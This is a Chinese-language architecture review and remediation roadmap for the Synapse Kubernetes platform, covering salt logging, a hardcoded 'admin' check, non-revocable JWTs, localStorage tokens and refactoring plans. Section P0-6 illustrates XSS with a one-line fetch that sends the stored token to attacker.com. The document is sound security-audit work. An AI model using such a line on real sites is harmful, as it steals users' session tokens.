# Synapse 架構反思與重構藍圖

> 「任何號稱『完美無缺』的系統都是在實驗室裡的玩具，承認缺陷，正是走向偉大的開始。」

**文件版本**：v1.0 — 2026-04-09
**審視範圍**：`internal/`、`pkg/`、`cmd/`、`ui/src/`
**文件目的**：
1. 明列已知設計缺陷、反模式、技術債
2. 規劃優化方向與修復優先序
3. 描繪重構藍圖與未來路線圖
4. 作為後續工作的單一事實來源（Single Source of Truth）

---

## 目錄

- [零、現況體檢數據](#零現況體檢數據)
- [一、嚴重等級（P0 — 必須立刻修）](#一嚴重等級-p0--必須立刻修)
- [二、高等級（P1 — 本季度內修復）](#二高等級-p1--本季度內修復)
- [三、中等級（P2 — 六個月內修復）](#三中等級-p2--六個月內修復)
- [四、低等級（P3 — 持續改善）](#四低等級-p3--持續改善)
- [五、重構藍圖](#五重構藍圖)
- [六、功能深度拓展](#六功能深度拓展)
- [七、未來方向路線圖](#七未來方向路線圖)
- [八、分階段交付計畫](#八分階段交付計畫)
- [附錄 A：程式碼統計](#附錄-a程式碼統計)
- [附錄 B：執行手冊索引](#附錄-b執行手冊索引)

---

## 零、現況體檢數據

| 項目 | 當前值 | 行業基準 | 差距 |
| --- | --- | --- | --- |
| 後端 Go 程式碼行數 | ~78,500 | — | — |
| 前端 TS/TSX 行數 | ~83,600 | — | — |
| Handler 檔案數 / 平均行數 | 69 / 428 | < 300 | 超標 43% |
| 最大 Handler 行數 | 1,339 (rollout.go) | < 500 | 超標 168% |
| 最大前端頁面行數 | 1,398 (CostDashboard) | < 600 | 超標 133% |
| Service 檔案數 / 平均行數 | 50 / 431 | < 400 | 超標 8% |
| 後端測試檔案數 | 7 | — | — |
| 後端測試行數 | 1,358 | — | 估 ~2% 覆蓋率 |
| 前端測試檔案數 | 6 | — | 估 ~1% 覆蓋率 |
| 失敗測試數量 | 1 (`TestDeleteUserGroup_Success`) | 0 | 🔴 |
| `handler.db` 注入檔數 | 40 | 0 | 🔴 |
| handler 內 raw GORM 呼叫次數 | 150+ | 0 | 🔴 |
| handler 內 `context.Background()` | 84 | 0 | 🔴 |
| `WithContext` 總呼叫次數 | 29 | — | 過低 |
| `Username == "admin"` 硬編碼 | 6 處 | 0 | 🔴 |
| `InsecureSkipVerify: true` | 4 處 | 0 (除白名單) | 🟡 |
| User model 有無 role 欄位 | ❌ 無 | ✅ | 🔴 |
| JWT 可撤銷 | ❌ 無 jti / 無 refresh | ✅ | 🔴 |
| Token 儲存方式 | localStorage | httpOnly cookie | 🔴 |
| OpenAPI/Swagger 文件 | ❌ 無 | ✅ | 🟡 |
| 分散式鎖 / Redis | ❌ 無 | ✅ (多節點場景) | 🟡 |
| 分散式追蹤 | ❌ 無 | ✅ | 🟡 |
| 多 tenant 隔離欄位 | ❌ 無 | — (視定位) | 🟡 |

> 結論：**系統已具備可用性，但在「可維運、可審計、可擴展」三個維度存在顯著技術債**。

---

## 一、嚴重等級 (P0 — 必須立刻修)

### P0-1 敏感資訊寫入日誌（Salt 洩漏）

**現象**

```go
// internal/services/auth_service.go:151
logger.Info("驗證密碼 - 使用者: %s, Salt: %s", username, user.Salt)
```

每次登入都把該使用者密碼 Salt 列印到 server log。若日誌流轉到 ELK / Loki / 外部 SIEM，Salt 立即外洩，降低 bcrypt 抗暴破能力（雖然 bcrypt 本身會用內嵌 salt，但我們的業務把 `password + user.Salt` 拼接後再餵給 bcrypt，外洩等同把雜湊空間預備資料給對手）。

**CLAUDE.md 第 9 節明文禁止 log sensitive data**。

**修正**

```go
// 移除 Salt
logger.Debug("authenticating local user", "username", username)
```

並全域掃描 `logger.(Info|Debug|Warn|Error).*(salt|Salt|password|Password|token|Token|kubeconfig|secret)`，一律整改。

### P0-2 Username == "admin" 硬編碼超管邏輯

**現象**

- `internal/middleware/permission.go:209` — `if username == "admin"`
- `internal/services/permission_service.go:361, 421, 553`
- `internal/services/user_service.go:111, 171`

`models.User` 本身**完全沒有 role 欄位**，整個平台管理員判斷依賴使用者名稱字面比較。任何人只要能把 DB 的 `users.username` 改掉，或建立一個 `username = "admin"` 的 LDAP 帳號，就能獲得平台超管權限。

**CLAUDE.md 第 10 節第三條明文禁止此模式**。

**修正**

1. 在 `User` model 加入：
   ```go
   SystemRole string `json:"system_role" gorm:"size:32;default:user;index"` // user | platform_admin | system_admin
   ```
2. 建立 `models/role.go` 常數：
   ```go
   const (
       RoleUser         SystemRole = "user"
       RolePlatformAdmin SystemRole = "platform_admin"
       RoleSystemAdmin   SystemRole = "system_admin" // 僅供 API Token / 內部程式使用
   )
   ```
3. 撰寫資料庫 migration：讀取 `username = 'admin'` 的使用者並標記為 `platform_admin`。
4. 替換所有 `username == "admin"` 為 `user.SystemRole == models.RolePlatformAdmin`。
5. 新增 `IsPlatformAdmin(userID)` helper + middleware。
6. 寫測試覆蓋權限判斷各種 role 組合。

### P0-3 失敗中的測試 (TestDeleteUserGroup_Success)

**現象**

```
--- FAIL: TestPermissionServiceSuite/TestDeleteUserGroup_Success
    permission_service_test.go:141
    刪除使用者組失敗: call to ExecQuery 'UPDATE user_groups SET deleted_at...'
    was not expected, next expectation is: ExpectedCommit
```

sqlmock 期望順序與實際 SQL 不符。測試一旦 FAIL，CI 保護網失效 → 其他新 bug 無法被攔截。

**修正**

1. 讀 `permission_service_test.go:141` 對應測試方法，補齊 `mock.ExpectExec` 的 soft-delete UPDATE 期望。
2. 導入 `make test` 作為 pre-push hook，保證綠燈才能 push。

### P0-4 Handler 層普遍違反分層原則

**證據**

- 40 個 handler 檔注入 `*gorm.DB`
- 150+ 處 raw GORM 呼叫 (`.Where/.First/.Find/.Create/.Update/.Delete/.Save`) 出現在 handler
- 僅 29 處 `WithContext` 在全專案
- 84 處 `context.Background()` 出現在 handler

後果：
1. **Context 遺失** — DB 查詢與請求生命週期脫鉤，使用者取消請求後查詢仍在跑，浪費連線
2. **無法 mock** — 測試必須起一個真實 DB
3. **跨層污染** — handler 需要理解 GORM 細節；service 層空心化
4. **違反 CLAUDE.md 第 1、2、3、5、6 節**

**修正**（漸進）

1. 先建立 `docs/REFACTOR_HANDLER.md` 列出 40 個檔案與建議 service 名稱
2. 每週清 5~10 個檔案，逐步把 DB 邏輯搬進 service
3. 強制新檔案不得注入 `*gorm.DB`（lint 規則 or code review check）
4. 在 `internal/handlers/common.go` 標示 `//lint:file-ignore` 但新增禁止 DB 注入的註解

### P0-5 JWT 不可撤銷、無 Refresh Token

**現象**

```go
// internal/services/auth_service.go:208
token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
    "user_id":   user.ID,
    "username":  user.Username,
    "auth_type": user.AuthType,
    "exp":       expiresAt.Unix(),
})
```

- 無 `jti`（JWT ID）→ 無法建立黑名單
- 無 `iss`/`aud`/`nbf`
- Logout 僅在前端刪 localStorage，token 在過期前持續有效
- JWT 一旦洩漏，唯一挽救手段是 **整個 JWT secret 輪換**，會讓所有線上 session 爆炸

**修正**

1. 加入 `jti: uuid.New().String()`
2. 新增 `token_blacklist` 或 `active_sessions` 表（SQLite 單機即可）
3. Logout 時寫入 `jti + exp` 到黑名單，AuthRequired 中介軟體查表
4. 過期 jti 由背景 worker 清理
5. 導入 Access Token (15min) + Refresh Token (7d) 雙 Token 機制
6. Refresh Token 以 **httpOnly Secure SameSite=strict cookie** 下發，Access Token 仍在 header（減少 XSS 面積）

### P0-6 Token 儲存於 localStorage（XSS 風險）

**現象**

```ts
// ui/src/utils/api.ts:14
const token = localStorage.getItem('token');
```

任何 XSS 漏洞都可以 `fetch('https://attacker.com?t=' + localStorage.token)`。

**修正**

- 把 Access Token 改放 `memory`（Zustand store / React context），頁面刷新時靠 Refresh Token (httpOnly cookie) 重新換取
- 設定嚴格的 `Content-Security-Policy` header，禁止 inline script 與 eval
- 設定 `X-Content-Type-Options: nosniff`、`X-Frame-Options: DENY`、`Referrer-Policy: strict-origin-when-cross-origin`
- 引入 `helmet`-style 中介軟體集中管理 security headers

---

## 二、高等級 (P1 — 本季度內修復)

### P1-1 Handler 檔案肥胖症

**前 5 大 handler**

| 檔案 | 行數 |
| --- | ---: |
| `rollout.go` | 1,339 |
| `networkpolicy.go` | 1,106 |
| `deployment.go` | 1,084 |
| `storage.go` | 1,045 |
| `pod.go` | 979 |

每個 handler 都包含 10+ 個 endpoint、自建 DTO、自建 converter、自建 validator。可維護性快速下滑。

**重構方向**

1. 按 endpoint group 拆檔：`rollout_list.go / rollout_detail.go / rollout_action.go`
2. 將 converter 獨立到 `internal/handlers/converters/`
3. DTO 統一到 `internal/handlers/dto/` 並依賴 `validator/v10` 做 struct tag 驗證
4. 目標：單檔 < 500 行、單函式 < 80 行

### P1-2 Router 單體檔案

`routes_cluster.go` 651 行全部 handler 在此內聯建構。新增一個資源就要改這個檔案，合併衝突頻繁。

**重構方向**

1. 每個資源領域獨立 `routes_<domain>.go`（`routes_workload.go` / `routes_network.go` / `routes_storage.go` / `routes_security.go`）
2. 引入輕量 DI：`wire` or 自寫 `container.go`；handler 建構改由 container 集中管理
3. router 只做「註冊」，不做「建構」
4. 新增單元測試覆蓋 route table 完整性（避免刪錯路由）

### P1-3 Service 層無介面 (interface)

目前所有 handler 直接依賴具體 service struct。導致：
- 測試必須手動 mock 或使用真實實例
- 無法做 decorator（如為特定 service 加統一快取、重試、熔斷）

**改進**

```go
// internal/services/contracts/cluster.go
package contracts

type ClusterService interface {
    GetCluster(id uint) (*models.Cluster, error)
    GetConnectableClusters() ([]*models.Cluster, error)
    // ...
}
```

handler 依賴介面而非結構。`go generate` + `mockery` 自動生成 mock。

### P1-4 無 OpenAPI / API 文件

REST API 超過 300 個 endpoint，卻沒有任何機讀規格。前後端協作依賴口頭溝通，外部整合困難。

**方案**

1. 短期：導入 `swaggo/swag`，在 handler 加 comment annotation 產生 `swagger.json`
2. 中期：規劃遷移到 `huma` 或 `ogen`，用 Go struct 反推 OpenAPI
3. 長期：考慮將核心 CRUD 改為 code-first GraphQL（`gqlgen`），可同時受益於 schema 驅動的前端型別生成

### P1-5 前端頁面肥胖症

| 檔案 | 行數 |
| --- | ---: |
| `CostDashboard.tsx` | 1,398 |
| `LogCenter.tsx` | 1,325 |
| `NodeList.tsx` | 1,148 |
| `DeploymentTab.tsx` | 1,071 |
| `ContainerTab.tsx` | 979 |

單頁面混雜資料抓取、狀態管理、UI、業務邏輯、converter。

**重構**

1. 抽出 `usePageX` hook 管理狀態與 queries
2. 抽出 `<PageXToolbar>` / `<PageXTable>` / `<PageXDrawer>` 子元件
3. Column 定義獨立為 `columns.tsx`，方便 i18n / snapshot test
4. 目標：單檔 < 400 行

### P1-6 Axios 請求 timeout 過短

```ts
// ui/src/utils/api.ts:6
timeout: 10000,
```

10 秒對於 K8s list + Prometheus 查詢經常不夠（60s 場景常見）。當前會產生「頁面白畫面」而非「等待中」。

**改善**

- 依 endpoint 類別分層：
  - 讀取單 resource → 15s
  - List / metrics → 60s
  - 大型匯出 (CSV) → 120s
- request interceptor 讀取 `config.meta.timeout`

### P1-7 前端無全域 ErrorBoundary

雖然 `ErrorBoundary.tsx` 存在，但未在 root 套用。單一頁面崩潰會讓整個 SPA 白畫面。

**修正**

在 `App.tsx` 最外層包 `<ErrorBoundary fallback={<ErrorPage />}>`，並依 Project Brain 中記錄的 pitfall：**不要直接暴露 `error.message`**，用通用文案 + 參考編號（request ID）。

### P1-8 In-Memory Rate Limiter 不跨實例

`middleware/rate_limit.go` 把登入失敗次數存在 Go 內的 `map[string]*loginAttempt`。多實例部署下，每個 pod 各自計數，攻擊者輪著 pod 打就能繞開。

**修正**

1. 抽象 `RateLimiter` interface，預設走 in-memory
2. 新增 `RedisRateLimiter` 實作（`go-redis/v9`）
3. 環境變數 `RATE_LIMITER_BACKEND=redis` 時啟用

### P1-9 測試覆蓋率嚴重不足

現況：7 個後端測試檔、6 個前端測試檔，覆蓋率估 < 5%。

**目標（3 個月）**

- 後端 service 層覆蓋率 ≥ 60%
- 後端 handler 層覆蓋率 ≥ 40%
- 前端關鍵頁面（登入、叢集列表、工作負載列表、權限管理）有 smoke test
- 建立 5 個 Playwright E2E 場景：登入、匯入叢集、建立 Deployment、刪除 Pod、查看 metrics

### P1-10 無分散式追蹤

目前 observability 只有 Prometheus metrics。K8s API 聚合 + DB 查詢 + Prometheus 查詢交織，單一請求 latency 難以定位。

**修正**

1. 導入 OpenTelemetry SDK（`go.opentelemetry.io/otel`）
2. Gin middleware 自動 span
3. GORM plugin 注入 DB span
4. HTTP client wrapper 對 Prometheus/Grafana/ArgoCD 請求自動 span
5. OTLP exporter 發送到使用者自訂的 Jaeger / Tempo

---

## 三、中等級 (P2 — 六個月內修復)

### P2-1 缺乏多租戶 (Multi-Tenant) 能力

現況所有使用者共享單一 DB、單一叢集視野。若要給多個團隊/客戶使用，需要：

- Tenant 實體（`Organization`）
- User ↔ Organization 多對多
- Cluster 歸屬於 Organization
- 所有資源查詢加 `tenant_id` 條件
- RBAC 重新設計為 `Org → Role → Permission`

**注意**：若 Synapse 定位就是「單組織內部運維平台」，可保留現狀並寫 ADR 記錄此決策；若要走 SaaS，則必須重構。

### P2-2 審計日誌未強化

`OperationLog` 有寫入但沒有：
- 雜湊鏈式防篡改（前一筆 hash 作為本筆 input）
- 批次上傳到 SIEM（Splunk / Elastic）
- 長期保存策略（保留 / 歸檔 / 刪除）
- 搜尋索引

**方案**

1. 加入 `prev_hash`、`hash` 欄位
2. 建立 `AuditSink` 介面，支援 `file`、`webhook`、`kafka`、`s3`
3. 加入歸檔 worker（90 天以上移到 S3 Glacier）

### P2-3 模型加密範圍太窄

只有 `Cluster.KubeconfigEnc / CAEnc / SATokenEnc` 加密。其他敏感欄位未加密：
- `LDAPConfig.BindPassword`
- `NotifyChannel.Token / SMTPPassword / SlackWebhook`
- `SIEMWebhookConfig.Secret`
- `AIConfig.APIKey`
- `ArgoCDConfig.Token`
- `CloudBillingConfig.Credentials`

**修正**

1. 在 models 全域檢視 `json:"-"` + 含有憑證語意的欄位
2. 套用 BeforeSave / AfterFind hook
3. 新增 `cmd/admin migrate-encrypt` 命令一次性加密已存明文

### P2-4 資料庫 Migration 機制過於原始

當前用 `gorm.AutoMigrate` 一次塞 28 張表。問題：
- 無版本控制（上線後無法回滾）
- 無 breaking change 偵測
- 欄位改 `not null` 時 GORM 不一定會修改既有欄位

**方案**

1. 導入 `golang-migrate/migrate` 或 `pressly/goose`
2. 現有 schema dump 為 `migrations/0000_init.sql`
3. 之後所有變更 = 新增 numbered migration file
4. 部署流程：Pod 啟動前跑 `synapse admin migrate up`

### P2-5 前端狀態管理散亂

雖然用 React Query 做資料同步，但全域 UI 狀態（目前叢集、主題、側邊欄）散落在多個 context。

**方案**

引入 `zustand`（極輕量）：

```ts
// ui/src/store/globalStore.ts
interface GlobalState {
  activeCluster: Cluster | null;
  setActiveCluster: (c: Cluster) => void;
  // ...
}
```

### P2-6 無 Feature Flag

上線新功能時沒有逐步放量機制，出問題只能整版 rollback。

**方案**

1. 簡單方案：新增 `feature_flags` 表 + `FeatureFlagService`
2. 進階方案：整合 Unleash / OpenFeature

### P2-7 前端 i18n 僅一種語言

目前 locales 有建構但實際多為中文硬編碼或只支援一種語系。

**修正**

1. 建立 `scripts/i18n-lint.ts` 掃描 `.tsx` 中硬編碼中文
2. CI pipeline 在硬編碼中文超標時 fail
3. 補齊英文翻譯

### P2-8 K8s Informer 無健康檢查

當前 informer 啟動後若某個叢集 API 壞掉、或 RBAC 變更導致 watch 失敗，informer 可能 silently 停擺，前端還是拿到舊資料。

**修正**

1. `ClusterInformerManager` 加入 `HealthCheck() map[uint]InformerHealth`
2. `/readyz` endpoint 納入 informer 狀態
3. 某叢集 informer 掛掉超過 5 分鐘自動 restart

### P2-9 前端無 Bundle Size 監控

`ui/dist` 無 bundle size budget，引入新套件可能導致首屏變慢。

**方案**

1. Vite plugin `rollup-plugin-visualizer` 產出 bundle map
2. CI 在 `dist/index.html` > 2MB 時 fail
3. 大型頁面改為 `React.lazy` + Suspense 延遲載入

---

## 四、低等級 (P3 — 持續改善)

| 項次 | 描述 | 建議 |
| --- | --- | --- |
| P3-1 | `fmt.Println` 出現在 runbooks.go | 替換為 `logger.Info` |
| P3-2 | 20 處 `InsecureSkipVerify: true` 需逐一檢視 nolint 註解 | 加 TLS 憑證註冊機制 |
| P3-3 | JWT MapClaims | 改用強型別 `jwt.Claims` struct |
| P3-4 | Makefile 缺 `make lint` / `make security` targets | 新增 golangci-lint、gosec 整合 |
| P3-5 | 無 SBOM (Software Bill of Materials) | 加入 `syft` 產生 SBOM |
| P3-6 | 無 container image signing | 引入 cosign |
| P3-7 | `deploy/docker-compose.yaml` 用 root 跑 | 切 non-root user |
| P3-8 | `synapse` binary 142MB (!!) | 檢查是否有未必要的 embed / debug symbol |
| P3-9 | 無一致的分頁工具 | 建立 `response.Paginate[T]` helper |
| P3-10 | 前端 error handling 散落各頁 | 建立 `useErrorHandler` hook |

### P3-8 深入：Synapse Binary 142MB 分析

142MB 對單一 Go binary 來說異常。可能原因：
1. `embed` 嵌入整個 `ui/dist`（合理，通常 5~10MB）
2. 未 strip debug symbols (`go build -ldflags="-s -w"`)
3. 引入過多 k8s client-go GVK，編譯產生大量 stubs

**驗證方法**

```bash
go tool nm -size synapse | sort -nr | head -40
go build -ldflags="-s -w" -o synapse-stripped .
upx --best synapse-stripped # 可選
```

目標：< 60MB

---

## 五、重構藍圖

### 5.1 目標架構

```
┌─────────────────────────────────────────────────────────────┐
│                      Presentation Layer                     │
│  ┌──────────────┐  ┌──────────────┐  ┌─────────────────┐    │
│  │ HTTP (Gin)   │  │ WebSocket    │  │ gRPC (future)   │    │
│  └──────┬───────┘  └──────┬───────┘  └────────┬────────┘    │
└─────────┼──────────────────┼───────────────────┼────────────┘
          │                  │                   │
┌─────────┼──────────────────┼───────────────────┼────────────┐
│                    Application Layer                        │
│  ┌──────▼─────────┐  ┌────▼────────┐  ┌───────▼─────────┐   │
│  │  Handlers      │  │ WS Hubs     │  │ gRPC Servers    │   │
│  │  (thin)        │  │             │  │                 │   │
│  └──────┬─────────┘  └──────┬──────┘  └────────┬────────┘   │
└─────────┼────────────────────┼──────────────────┼──────────┘
          │                    │                  │
┌─────────┼────────────────────┼──────────────────┼──────────┐
│                     Domain Service Layer                   │
│  ┌──────▼──────────────┐ ┌──▼────────────┐ ┌──▼──────────┐ │
│  │ ClusterSvc          │ │ WorkloadSvc   │ │ CostSvc     │ │
│  │ PermissionSvc       │ │ StorageSvc    │ │ AuditSvc    │ │
│  │ AuthSvc             │ │ NetworkSvc    │ │ MetricSvc   │ │
│  │ (interfaces)        │ │ SecuritySvc   │ │ AISvc       │ │
│  └──────┬──────────────┘ └──┬────────────┘ └──┬──────────┘ │
└─────────┼────────────────────┼──────────────────┼──────────┘
          │                    │                  │
┌─────────┼────────────────────┼──────────────────┼──────────┐
│                    Infrastructure Layer                    │
│  ┌──────▼────────┐ ┌─────────▼──────┐ ┌─────────▼───────┐  │
│  │ Repository    │ │ K8s Client     │ │ External HTTP   │  │
│  │ (GORM wrapper)│ │ (Informer+     │ │ (Prom/Grafana/  │  │
│  │               │ │  Live+Dynamic) │ │  ArgoCD/AI)     │  │
│  └──────┬────────┘ └─────────┬──────┘ └─────────┬───────┘  │
└─────────┼────────────────────┼──────────────────┼──────────┘
          │                    │                  │
   ┌──────▼──────┐      ┌──────▼──────┐    ┌──────▼──────┐
   │ MySQL /     │      │ K8s Clusters│    │ Prometheus/ │
   │ SQLite      │      │             │    │ Grafana/etc │
   └─────────────┘      └─────────────┘    └─────────────┘
```

### 5.2 關鍵重構動作

#### 動作 1 — 引入 Repository 層

```go
// internal/repository/cluster.go
type ClusterRepository interface {
    GetByID(ctx context.Context, id uint) (*models.Cluster, error)
    List(ctx context.Context, q ClusterQuery) ([]*models.Cluster, error)
    Create(ctx context.Context, c *models.Cluster) error
    Update(ctx context.Context, c *models.Cluster) error
    SoftDelete(ctx context.Context, id uint) error
}

type gormClusterRepo struct {
    db *gorm.DB
}

func (r *gormClusterRepo) GetByID(ctx context.Context, id uint) (*models.Cluster, error) {
    var c models.Cluster
    if err := r.db.WithContext(ctx).First(&c, id).Error; err != nil { ... }
    return &c, nil
}
```

**原則**：
- 所有 `gorm.DB` 呼叫只能在 `repository/` 裡
- service 依賴 repository **介面**，非具體實作
- handler 不直接認識 repository

#### 動作 2 — Service Interface 化

1. `internal/services/` 維持現狀（結構體實作）
2. `internal/services/contracts/` 新增介面定義
3. `handlers` 改為依賴 `contracts.XxxService`
4. `mockery` 產生 `mocks/`

#### 動作 3 — 路由拆分

```
internal/router/
  router.go               // Setup() 主入口
  deps.go                 // 所有依賴匯集
  middleware.go           // Gin middleware 註冊
  routes_auth.go          // /auth/*
  routes_user.go          // /users/*
  routes_cluster.go       // /clusters/*（僅叢集基本 CRUD）
  routes_workload.go      // /clusters/:id/{deployments,statefulsets,...}
  routes_network.go       // /clusters/:id/{services,ingresses,gateways,...}
  routes_storage.go       // /clusters/:id/{pvcs,pvs,storageclasses}
  routes_security.go      // /clusters/:id/{rbac,networkpolicies,cert-manager}
  routes_observability.go // /clusters/:id/{monitoring,alerts,logs}
  routes_cost.go          // /clusters/:id/{cost,billing,resources}
  routes_ai.go            // /clusters/:id/ai/*
  routes_system.go        // /system/*
  routes_ws.go            // /ws/*
```

每個檔案 < 300 行。

#### 動作 4 — DTO 驗證統一

```go
// internal/handlers/dto/deployment.go
type CreateDeploymentRequest struct {
    Name      string            `json:"name" binding:"required,min=1,max=253,k8sname"`
    Namespace string            `json:"namespace" binding:"required,k8sname"`
    Image     string            `json:"image" binding:"required"`
    Replicas  int32             `json:"replicas" binding:"gte=0,lte=100"`
    Labels    map[string]string `json:"labels" binding:"dive,keys,k8slabelkey,endkeys,k8slabelvalue"`
}
```

自訂 `validator.RegisterValidation("k8sname", validateK8sName)` 等 tag。

#### 動作 5 — 錯誤處理統一管道

目前 `apierrors.AppError` 已存在但未普遍使用。

1. 所有 service 方法返回 `AppError` 或 `wrapped error`
2. Handler 層統一使用 helper：
   ```go
   if err != nil {
       response.FromError(c, err) // 自動判別 AppError / gorm / k8serrors
       return
   }
   ```
3. `response.FromError` 負責：
   - `AppError` → 用其 `HTTPStatus` + `Code`
   - `gorm.ErrRecordNotFound` → 404
   - `k8serrors.IsNotFound` → 404
   - `k8serrors.IsForbidden` → 403
   - 其餘 → 500 + RequestID

### 5.3 不重構的地方

不是什麼都要重寫。以下維持現狀：

- `pkg/crypto` — 設計良好的 KeyProvider 抽象
- `internal/middleware/request_id.go` — OK
- `internal/metrics` — Prometheus 整合 OK
- `ClusterInformerManager` — 核心設計合理，只需補 health check
- 前端 `services/` 層 — API 封裝已足夠好

---

## 六、功能深度拓展

以下是在「修完技術債」之後可以考慮的功能深化方向，按優先序排列：

### 6.1 GitOps 整合深化

- Flux CD 整合（目前只有 ArgoCD）
- Git repo 關聯視圖：從 Deployment 反查最後修改的 commit
- Pull Request preview：對 PR 裡的 YAML 做 dry-run diff

### 6.2 AI 能力深化

目前有 `ai_chat`、`ai_nlquery`、`ai_runbook`。可再加：

- **AI 根因分析**：Pod 崩潰時自動抓 events + logs + metrics 生成分析報告
- **容量規劃助手**：基於 Prometheus 歷史資料預測未來 1/3/6 個月資源需求
- **AI 生成 YAML**：對話式建立 Deployment/HPA/NetworkPolicy
- **AI 審批助手**：PR review by LLM（整合 cert-manager 等敏感資源變更）

### 6.3 多叢集拓撲進化

- Cluster Federation 視角：把多個叢集當作邏輯一體展示
- 跨叢集 traffic flow 視覺化
- 多叢集 failover drill 模擬

### 6.4 安全治理加強

- 映像簽章驗證（cosign）
- SBOM 比對：上線版本 vs 最新掃描結果
- OPA/Gatekeeper 政策編輯器 + dry-run
- Secrets sprawl 掃描：追蹤 Secret 被掛載到哪些 Pod
- SSL 憑證到期提醒（已有 worker，可加 Email/Slack 通知深化）

### 6.5 開發者體驗 (DevEx)

- `synapse-cli`：對應 UI 功能的 CLI 工具（基於同一套 service）
- `synapse-vscode`：VSCode extension 整合 context switch + log tail
- 一鍵 `kubectl` context 同步到 kubeconfig 檔案

### 6.6 成本分析深化

目前已有 cost dashboard + 浪費識別 + 雲帳單整合。可再加：

- 每個 Namespace 的預算設定與超支告警
- Rightsizing 自動建議（基於 VPA + Prometheus 歷史）
- FinOps 報告自動生成（月報 / 季報 PDF）
- Reserved Instance / Savings Plan 模擬

### 6.7 SLO / SLI 管理

- 建立 SLO 定義與追蹤介面（整合 Prometheus）
- Error Budget 燃燒率告警
- 與 PagerDuty / Opsgenie 整合
- 事後檢討範本自動生成

### 6.8 混沌工程 (Chaos Engineering)

- 整合 Chaos Mesh / LitmusChaos
- 實驗排程與結果視覺化
- 與 AI 根因分析結合評分

### 6.9 Audit + Compliance

- SOC2 / ISO27001 / CIS Kubernetes Benchmark 對應報告生成
- 合規證據收集器（自動截圖+匯出）
- 違規事件時間線

### 6.10 使用者自助化

- Namespace self-service 申請工作流（整合審批）
- 自助 quota 申請
- PVC / DB 一鍵還原

---

## 七、未來方向路線圖

### 7.1 技術棧演進

| 層級 | 現在 | 短期（3 個月） | 中期（6 個月） | 長期（12 個月） |
| --- | --- | --- | --- | --- |
| Go 版本 | 1.25 | 1.25 | 1.26 | 1.27 |
| Web 框架 | Gin | Gin | Gin + huma | huma + gRPC-gateway |
| DB | SQLite + MySQL | +PostgreSQL | +TiDB (for multi-region) | CockroachDB option |
| Cache | 無 | Redis | Redis Cluster | Dragonfly |
| Queue | 無 (goroutine) | asynq (Redis) | NATS JetStream | NATS + Temporal |
| 追蹤 | 無 | OTel + Tempo | OTel + Jaeger + Tempo | Full APM |
| 前端 | React 19 + Vite | + Zustand | + module federation | micro-frontends |
| Auth | Local + LDAP | + OIDC | + SAML | + SCIM provisioning |

### 7.2 部署型態演進

- **現在**：單 binary + embedded UI，一個 Pod
- **3 個月**：Helm Chart 化，支援 HA (2+ replicas) + Redis backend
- **6 個月**：Operator 模式，透過 CRD 管理 Synapse instance + `SynapseCluster` CRD
- **12 個月**：Synapse as a Service：SaaS 版本，多 tenant，地理分佈式

### 7.3 開源治理

- 建立 `CONTRIBUTING.md`、`CODE_OF_CONDUCT.md`、`SECURITY.md`
- Issue template + PR template
- 導入 Conventional Commits
- Release Please 自動化 changelog
- 公開 Roadmap GitHub Project

### 7.4 社群生態

- Plugin 機制：透過 WASM / gRPC 讓第三方擴充 UI + API
- Extension marketplace
- Theme 系統（客戶化品牌色）

---

## 八、分階段交付計畫

### Phase 0 — 急救（1~2 週）

**目標**：解除所有 P0 阻斷。

- [ ] **P0-1** 移除 Salt 日誌輸出
- [ ] **P0-2** 新增 `SystemRole` 欄位 + migration + 替換所有 `username == "admin"`
- [ ] **P0-3** 修復 `TestDeleteUserGroup_Success` 失敗測試，確保 `go test ./...` 綠燈
- [ ] **P0-5** 加入 `jti` 到 JWT，新增 `token_blacklist` 表 + blacklist middleware
- [ ] **P0-6** Token 移出 localStorage（先做到 memory 即可，cookie 留 Phase 1）
- [ ] 新增 `make check` target：`test + lint + vet + gosec`
- [ ] pre-commit hook 強制 `make check` 通過
- [ ] 把 **本文件** 加入 `docs/ARCHITECTURE_REVIEW.md`（本次提交）

**交付物**：P0 清單全綠、CI 綠燈、Security incident 報告

### Phase 1 — 止血（4~6 週）

**目標**：解決 P0-4 與 P1 最重要事項。

- [ ] **P0-4** Repository 層導入，試點 3 個 domain（Cluster/User/Permission）
- [ ] **P1-2** 路由拆分到 10 個 domain 檔案
- [ ] **P1-3** Service Interface 化（搭配 Repository）
- [ ] **P1-4** 導入 swaggo/swag 產生 OpenAPI
- [ ] **P1-6** Axios timeout 分層
- [ ] **P1-7** 套用全域 ErrorBoundary
- [ ] **P1-9** 測試覆蓋率：service ≥ 30%、handler ≥ 20%
- [ ] 建立 `docs/CONTRIBUTING.md` 與 Code Review Checklist

### Phase 2 — 體質改善（2~3 個月）

- [ ] **P0-4** Repository 層覆蓋到所有 40 個 handler
- [ ] **P1-1** Handler 拆分至 < 500 行/檔
- [ ] **P1-5** 前端頁面肥胖症 Top 10 頁面拆分
- [ ] **P1-8** Redis RateLimiter 實作
- [ ] **P1-9** 測試覆蓋率：service ≥ 60%、handler ≥ 40%
- [ ] **P1-10** OpenTelemetry 導入
- [ ] **P2-4** golang-migrate 遷移取代 AutoMigrate
- [ ] **P2-8** Informer 健康檢查

### Phase 3 — 擴展基礎（4~6 個月）

- [ ] **P2-1** Multi-tenant 能力（或寫 ADR 決定不做）
- [ ] **P2-2** 審計日誌雜湊鏈
- [ ] **P2-3** 全面欄位加密
- [ ] **P2-5** Zustand 狀態管理
- [ ] **P2-7** i18n 英文完整化
- [ ] **P2-9** Bundle size monitoring + lazy loading
- [ ] 6.x 深化功能選擇 2~3 項實作

### Phase 4 — 平台化（6~12 個月）

- [ ] Helm Chart HA 部署
- [ ] Synapse Operator
- [ ] 6.x 剩餘功能
- [ ] gRPC API 選擇性開放
- [ ] Plugin 機制試點

---

## 附錄 A：程式碼統計

### A.1 Handler 檔案（前 15 大）

| 檔名 | 行數 |
| --- | ---: |
| rollout.go | 1,339 |
| networkpolicy.go | 1,106 |
| deployment.go | 1,084 |
| storage.go | 1,045 |
| pod.go | 979 |
| service.go | 850 |
| ingress.go | 849 |
| cluster.go | 768 |
| multicluster.go | 758 |
| resource_yaml.go | 726 |
| log_center.go | 709 |
| namespace.go | 669 |
| gateway.go | 654 |
| kubectl_terminal.go | 647 |

### A.2 Service 檔案（前 15 大）

| 檔名 | 行數 |
| --- | ---: |
| prometheus_service.go | 1,715 |
| om_service.go | 1,195 |
| gateway_service.go | 1,107 |
| k8s_client.go | 1,103 |
| overview_service.go | 1,083 |
| ai_tools.go | 963 |
| resource_service.go | 854 |
| argocd_service.go | 853 |
